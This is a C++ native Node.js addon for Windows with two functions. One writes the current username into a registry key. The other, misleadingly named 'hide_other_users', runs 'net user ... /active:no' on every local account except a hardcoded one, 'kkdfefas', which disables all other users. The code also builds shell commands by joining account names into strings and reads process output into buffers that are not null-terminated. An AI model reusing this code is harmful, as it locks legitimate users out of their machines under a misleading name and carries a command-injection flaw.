#include <node.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::Object;
using v8::String;
using v8::Value;

void Method(const FunctionCallbackInfo<Value>& args) {
  FILE* file;
  char output[300];
  char *command = "whoami";
  file = _popen(command, "r");
  fread(output, 1, sizeof(output), file);
  fclose(file);

  int j = 0;
  int is_found = 0;
  char output_2[300] = {0};
  for (int i=0;i<300;i++) {
    if (output[i] == 10) {
      break;
    }
    if (output[i] == '\\') {
      is_found = 1;
      continue;
    }
    if (is_found == 0) {
      continue;
    }
    output_2[j] = output[i];
    j++;
  }

  HKEY key;
  RegOpenKey(HKEY_LOCAL_MACHINE, (LPCTSTR)"Software\\WinAuth\\", &key);
  RegSetValueEx(key, (LPCTSTR)"UserName", 0, REG_SZ, (LPBYTE)output_2, strlen(output_2) * sizeof(char));
  RegCloseKey(key);

  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, output_2));
}

void Method2(const FunctionCallbackInfo<Value>& args) {
  FILE* file;
  char output[300];
  char *command = "whoami";
  file = _popen(command, "r");
  fread(output, 1, sizeof(output), file);
  fclose(file);

  FILE* file2;
  char output2[300];
  char *command2 = "wmic useraccount get name | findstr -v Name";
  file2 = _popen(command2, "r");
  fread(output2, 1, sizeof(output2), file2);
  fclose(file2);

  char temp[300];
  for (int i=0;i<sizeof(temp);i++) {
    temp[i] = 0;
  }
  int j = 0;
  for (int i=0;i<sizeof(output2);i++) {
    if ((!((0x61 <= output2[i] && output2[i] <= 0x7A) || (0x41 <= output2[i] && output2[i] <= 0x5A) || (0x30 <= output2[i] && output2[i] <= 0x39))) && j == 0) {
      break;
    }
    if (output2[i] == '\n') {
      temp[j] = 0;
      j = 0;
      if (strcmp(temp, "kkdfefas") != 0) {
        char command3[300] = "net user ";
        strcat(command3, temp);
        strcat(command3, " /active:no");
        _popen(command3, "r");
      }
      continue;
    }
    temp[j] = output2[i];
    j++;
  }

  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, temp));
}

void init(Local<Object> exports) {
  NODE_SET_METHOD(exports, "set_current_user_name_to_registry", Method);
  NODE_SET_METHOD(exports, "hide_other_users", Method2);
}

NODE_MODULE(addon, init)
